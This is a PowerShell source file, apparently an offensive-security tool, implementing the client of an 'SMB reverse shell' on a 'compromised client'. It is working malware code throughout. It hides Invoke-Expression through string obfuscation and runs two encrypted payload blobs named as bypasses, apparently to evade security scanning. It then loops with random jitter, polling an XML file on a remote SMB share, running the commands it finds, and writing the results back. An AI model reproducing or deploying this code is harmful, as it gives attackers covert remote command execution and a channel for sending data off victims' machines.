<#
.SYNOPSIS
SMB reverse shell - Client component

.DESCRIPTION

Execute Powershell commands on a remote host by using an encrypted XML file and accessible SMB share.

.PARAMETER SmbFile

The path to XML file containing the commands and results.

.EXAMPLE

Invoke-SmbObey -SmbFile \\192.168.1.1\share\file.xml

Start reverse shell on compromised client.

.NOTES

Author: r1cksec
License: GNU General Public License

#>
Function Invoke-SmbObey
{
    Param
    (
        [Parameter(Mandatory=$true)][string]$XmlFile = ""
    )
    
    [array]$InternetExplorer = "I","n","t","e","r","n","E","t","e","X","p","l","o","r","e","r"
    $NewInvokeExpression = ""
    
    foreach ($Char in $InternetExplorer)
    {
        if ($Char -cmatch '[A-Z]')
        {
            $NewInvokeExpression = $NewInvokeExpression + $Char
        }
    }
    
    Set-Alias RunCommand $($NewInvokeExpression)

    $Hostname = ToBase64 -str "$env:computername"
    $User = ToBase64 -str "$env:username"
    $RandomString = Get-RandomString
    $Session = Get-Md5Hash($Hostname + $User + $RandomString)

    [byte[]] $AesSalt = @(9,35,13,64,33,123,192,9,74,12,254,53,152)
    $AesPassword = "CommandLineHeroes>_"
    $AesPassword = [system.text.encoding]::ASCII.GetBytes($AesPassword)

    $BypassPower = "fqg3q5ny+c8H8A24lmcZGv13vN0By5+cM4r1Y9CI1zt/nTrJ//ZapuSuQtAwnlf4n3NsiYE/3DEI/uFldfHPU5ckMIelNRj9tUtTyfjBJbnhjKXFWB0JCBPQMJI8uyVp17CF6QJa/WmSsxHs/sOB5BJyboQEU9q/fVm0ApO7CCEPv6t7Ax0Erei3lmEuwWjA5COodSsxQ7JsvYvk9vBwKil3qhOr6xSVt2IQwDaZ4Et+VbQboSf4ytAPgKnmEfgic0xJtxCNTwr3wsF9/J5V5kHd/08C/5mWKMjD5Kz/xoKeucO2JXUuDAmeGiG/a55j5G3RP/deAKv2jPx3wP/OqqqRxclRNjsvk+F6YrS93BcgbO7LeMKZ3Sw16JO91fsE6dpt1ZG+N2pUhVu6+TaIjhCe957UaukU7MH6DYzerDs="
    $BypassNet = "evNbRJPyVg9JBCRD+SU5SWMpuYzGmGPbU38SNYElSFGqWumcEEpBzlo2vjtGEWoiOG4xWlqN1+7vJs25dxJ5a2SLk61dBL5UgKbJs1VRLiKtoAQR1fDBHvlFu6Nt6+1oEYFZ8rsbpQus0YteA2AFyhtuuSFx3RtUaUaV/0ydHRJrzzoSfovBPyp9+NFIM/hiBG8rTc2w6jA5DkR8wO9ag51rte1eNjSQbplMUeUwYVCmCzIofL+4j7xadqT4W1m/WpSetsXwJuIR3BbZxVUvSryM4pHfkwdKRQC8JxYt0yGJDv7XGnGDkvoqzvmKT8MW8YioSarK+G6eBfBhhBis79u2DlHFnJodt2TpAJFwRkdP+ZXbEbOpSHh8PKK5oGquTOi36aE8lhXdwOSy6qEIoFZBxujD6AOx1SYlPVNBJCC99B4iXiaA/wlc5ffvbE070C151U3qeSTteyJkIcSW9IkHP2kM2r5r561Tkp5eKxR4YxZQCv6cFaJ7wn+nmGfnXL91+zkj9BYLsfFQwMnTZZE026Pbgv+hg4HgZZYa7cy8qqUI2u3IUu6DkzR2tdUO+1uu+MH6gHOSrRPwhWKgbGJf1mujgD4urpAPrGjf7zgDPiaKxYzPwE0eAv6Qv+KER4RHiLEGJ/JTPp5fIkd3cXMVegAGo5tPwAwQ3gTf/MdDmznQF50qwZEWs9CauZY9RQ+cMPUA+YRVRQL1WfvlLeperbm+C6DYeMD/wrB6TWpsM93kiJa5Kxr9M2z9gLz0CaDOO//jEt5tkezIaVtkSMgYjVv0NIj7tod8nOZ6L4PoBCYX1aZyPaWU3KETSRnzwq9UJdXV1ez+SOQ2kxSNawxzNBb0V3wu7kT1BESWhAT5OvwygcfeEPZUW8DWLTMW7ijHSS6/fZW4tD3WViUuYDKDxXzT73lXx41wHF5A/biEB12V8Ag3zOq8ePt7FqMUux22Uil81iQoccAf2N+HqlRGtrCuBNGVOdD3bnhTYnvfiwCzJvS6IyueaXBRcX6JlzxjTOMXbbp42/NEInJovz96z2YFBTfWJcpURkOH22LyxU1w/n62zDEuBwV2T5mE5qScbjp9+DmDH0Jews6sdA8gmIk7yzznl9F0/ID6bijbomx2EaZzWvMw94Mf3dvO9Rhxr85m9/wvcq0zFtIDzRs+Df2Yj91dK2QChFuf1+W1XLFLl8GM/P7XhxWPwE5Fh4R3dN6XpG+nZLiXXX0Sz6Riu5NUqQGg1L7Icb40i/cPdTUHZTvhD57ksldTYsoEf+1smG/Lr97yx46HbMVVyeHE2lQAGc3UlhdAT+Ws10DkklpVl8UIy4kG9GAinjVlF7GBz+JE2GGdOYM4D3T3CED53k3E3uj1fE1UbbNNiZhsaOu6vBYR7kWGzH1UJ2cMcsy9l2POSbzKb8zLbmBdIgu5YoYVThwl2JHsdtvCk+HEgffajaMMCwG7PsG2jfhGmZW9rTo0KQrga+jQp9/lzdVZhtirAetTUgvVOlup6ddLs7C4j68XoMYsLhCnwNe5xIAo2YxPIRoEMvKVE3pHzCbtH8c5YSeuShGWoGz8EP4JzlBf1SadD6PaU8gBlh/KpMDAcnImyrGX1BziddJFklpv9A51JJOcpfhojKUIdt6Apjbi1rhWN94u+bLLsWVpnyTeI89IcjhW5qbE4Jp27YFWBIvsxaCmOhbYBIFkR8GIrFoI5H0T8XVJ2rCzGFqBN+0yR7zVTd+Q3O/PZJbwQJEqZapUm2sPuPHaTxWgVRNl2cVUGmuGSgUrBH9tuaZHV+oQudUMcrL/ihs9XlmiGpwgKyZIL+jUoPVP1SlgHN+zQl7OHCH2S2PAeSVHHiQjCsORYCVNzM27gJF8ikg45gsN5dcJ6k5j1JvYw9xe41vSZYewvaz+Yy+TXYUaFMkTUd6c4PjktlZ/Li0dTH5c0uqrdmP5enf6nYwbU/A6ySMA2iWZeYGmle5yKll9FRDp8bFDVV9p7D6g1OTVNMo0TV3+S72mYnojSoKI4dR5b1gcUJQL0a51+2YkoCXDUHBix2xYtPZrm2mPQ5dztzksJqzk5j4tkg9oTRPrzIveld6DLkzeWWf7kjumE+rwG6CZ3iIu+O2J5bRR/y0jjwxPRJ0rC9NTYnze1DVa5fBiXhiwa9QXZlCSPTm40St7jIh9pExykXP/B/23ZEsi2+MDww=="
    Bypass($BypassPower)
    Bypass($BypassNet)

    while ($True)
    {
        $Jit = Get-Random -Minimum 1 -Maximum 6
        Start-Sleep -s $Jit

        if (Test-Path -path $XmlFile)
        {
            # decrypt
            $XmlContent = New-Object XML 
            [byte[]]$DecryptedContent = $Null
            $RawContent = Import-Clixml $XmlFile
            $EncryptedContent = [Convert]::FromBase64String($RawContent)
            $CleartextXml = AesDecrypt($EncryptedContent)
            $XmlContent.loadxml($CleartextXml)

            $CurrentSession = ($XmlContent.SelectNodes('//session') | Where-Object {$_.id -eq $Session})

            if ($CurrentSession -eq $Null)
            {
                $Sessions = ($XmlContent.SelectNodes('//sessions'))
                $NewSession = $XmlContent.CreateElement("session")
                $NewSession.SetAttribute("id", $Session)
                $NewSession.SetAttribute("hostname", $Hostname)
                $NewSession.SetAttribute("user", $User)
                $Lastseen = Get-Date -Format "HH:mm dd/MM/yyyy"
                $NewSession.SetAttribute("lastseen", $Lastseen)
                $Sessions.AppendChild($NewSession) | Out-Null

                # encrypt
                [byte[]]$EncryptedContent = $Null
                $XmlAsString = $XmlContent.OuterXml
                $XmlBytes = [system.text.encoding]::ASCII.GetBytes($XmlAsString)
                $EncryptedContent = AesEncrypt($XmlBytes)
                $EncryptedBase64 = [Convert]::ToBase64String($EncryptedContent)
                $EncryptedBase64 | Export-Clixml $XmlFile
                continue
            }
            else
            {
                $CurrentSession = ($XmlContent.SelectNodes('//session') | Where-Object {$_.id -eq $Session})
                $CurrentSession.lastseen = (Get-Date -Format "HH:mm dd/MM/yyyy").ToString()

                # flag used to keep track of commands that has been processed
                $CommandIsPending = "0"

                foreach ($CurrCommand in $CurrentSession.command)
                {
                    # execute unprocessed commands
                    if ($CurrCommand.date -eq "pending")
                    {
                        # replace xml element result = processed
                        $CommandTimestamp = (Get-Date -Format "HH:mm dd/MM/yyyy").ToString()
                        $CurrCommand.date = $CommandTimestamp
                        $CurrCommand.result = "cHJvY2Vzc2VkCg=="

                        # encrypt
                        [byte[]]$EncryptedContent = $Null
                        $XmlAsString = $XmlContent.OuterXml
                        $XmlBytes = [system.text.encoding]::ASCII.GetBytes($XmlAsString)
                        $EncryptedContent = AesEncrypt($XmlBytes)
                        $EncryptedBase64 = [Convert]::ToBase64String($EncryptedContent)
                        $EncryptedBase64 | Export-Clixml $XmlFile

                        # execute command
                        $DecodedCommand = FromBase64($CurrCommand.execute)

                        # calculate id value to be able to identify corresponding xml element after command execution
                        $CommandIsPending = "1"

                        $CommandId = Get-Md5Hash($CurrCommand.date + $CurrCommand.command)

                        try
                        {
                            $Result = (RunCommand $DecodedCommand | Out-String)
                            $Status = "Success!"
                        }
                        catch
                        {
                            $Result = ($_ | Out-String)
                            $Status = "Error!"
                        }

                        break
                    }
                }

                # after command execution write down the result to the corresponding xml element
                if($CommandIsPending -eq "1")
                {
                    # decrypt
                    $XmlContent = New-Object XML 
                    [byte[]]$DecryptedContent = $Null
                    $RawContent = Import-Clixml $XmlFile
                    $EncryptedContent = [Convert]::FromBase64String($RawContent)
                    $CleartextXml = AesDecrypt($EncryptedContent)
                    $XmlContent.loadxml($CleartextXml)

                    $CurrentSession = ($XmlContent.SelectNodes('//session') | Where-Object {$_.id -eq $Session})
                    $CurrentSession.lastseen = (Get-Date -Format "HH:mm dd/MM/yyyy").ToString()

                    foreach ($CurrCommand in $CurrentSession.command)
                    {
                        if ($CurrCommand.result -eq "cHJvY2Vzc2VkCg==")
                        {
                            $CurrCommandId = Get-Md5Hash($CurrCommand.date + $CurrCommand.command)

                            if ($CurrCommandId -eq $CommandId)
                            {
                                $CurrCommand.result = ToBase64($Result)
                                $CurrCommand.status = $Status
                                
                                # encrypt
                                [byte[]]$EncryptedContent = $Null
                                $XmlAsString = $XmlContent.OuterXml
                                $XmlBytes = [system.text.encoding]::ASCII.GetBytes($XmlAsString)
                                $EncryptedContent = AesEncrypt($XmlBytes)
                                $EncryptedBase64 = [Convert]::ToBase64String($EncryptedContent)
                                $EncryptedBase64 | Export-Clixml $XmlFile
                                break
                            }
                        }
                    }
                }
                else
                {
                    # encrypt
                    [byte[]]$EncryptedContent = $Null
                    $XmlAsString = $XmlContent.OuterXml
                    $XmlBytes = [system.text.encoding]::ASCII.GetBytes($XmlAsString)
                    $EncryptedContent = AesEncrypt($XmlBytes)
                    $EncryptedBase64 = [Convert]::ToBase64String($EncryptedContent)
                    $EncryptedBase64 | Export-Clixml $XmlFile
                }
            }
        }
        else
        {
            Start-Sleep 10;
            continue;
        }
    }
}

function FromBase64([String] $Str)
{
    $Enc = [system.Text.Encoding]::UTF8
    $Bytes = [System.Convert]::FromBase64String($Str)
    return $Enc.GetString($Bytes)
}

function ToBase64([String] $Str)
{
    $Enc = [system.Text.Encoding]::UTF8
    $Bytes = $Enc.GetBytes($Str)
    return [Convert]::ToBase64String($Bytes)
}

function Get-RandomString()
{
    $randString = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
    return $randString
}

function Get-Md5Hash($OriginString)
{
    $Md5Object = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $Utf8Object = New-Object -TypeName System.Text.UTF8Encoding
    $Md5Hash = [System.BitConverter]::ToString($Md5Object.ComputeHash($Utf8Object.GetBytes($OriginString)))
    return $Md5Hash.replace("-","")
}

function Bypass($RawContent)
{
    [byte[]]$DecryptedContent = $Null
    $EncryptedContent = [Convert]::FromBase64String($RawContent)
    $CleartextBase64 = AesDecrypt($EncryptedContent)
    $Cleartext = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($CleartextBase64))
    RunCommand $ClearText
}

function AesEncrypt([byte[]]$BytesToEncrypt)
{
    [byte[]] $encryptedBytes = @()
    [System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream
    [System.Security.Cryptography.RijndaelManaged] $AesObject = New-Object System.Security.Cryptography.RijndaelManaged
    $AesObject.KeySize = 256;
    $AesObject.BlockSize = 128;
    [System.Security.Cryptography.Rfc2898DeriveBytes] $Key = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($AesPassword, $AesSalt, 1000);
    $AesObject.Key = $Key.GetBytes($AesObject.KeySize / 8);
    $AesObject.IV = $Key.GetBytes($AesObject.BlockSize / 8);
    $AesObject.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream, $AesObject.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)

    try
    {
        $CryptoStream.Write($BytesToEncrypt, 0, $BytesToEncrypt.Length);
        $CryptoStream.Close();
    }
    catch [Exception]
    {
        Start-Sleep 60
        continue
    }

    $EncryptedContent = $MemoryStream.ToArray();
    return $EncryptedContent
}

function AesDecrypt([byte[]]$BytesToDecrypt)
{
    [byte[]]$DecryptedBytes = @();
    [System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream
    [System.Security.Cryptography.RijndaelManaged] $AesObject = New-Object System.Security.Cryptography.RijndaelManaged
    $AesObject.KeySize = 256;
    $AesObject.BlockSize = 128;
    [System.Security.Cryptography.Rfc2898DeriveBytes] $Key = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($AesPassword, $AesSalt, 1000);
    $AesObject.Key = $Key.GetBytes($AesObject.KeySize / 8);
    $AesObject.IV = $Key.GetBytes($AesObject.BlockSize / 8);
    $AesObject.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream, $AesObject.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)

    try
    {
        $CryptoStream.Write($BytesToDecrypt, 0, $BytesToDecrypt.Length)
        $CryptoStream.Close()
    }
    catch [Exception]
    {
        Start-Sleep 60
        continue
    }

    $DecryptedBytes = $MemoryStream.ToArray();
    $ClearText = [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
    return $ClearText
}

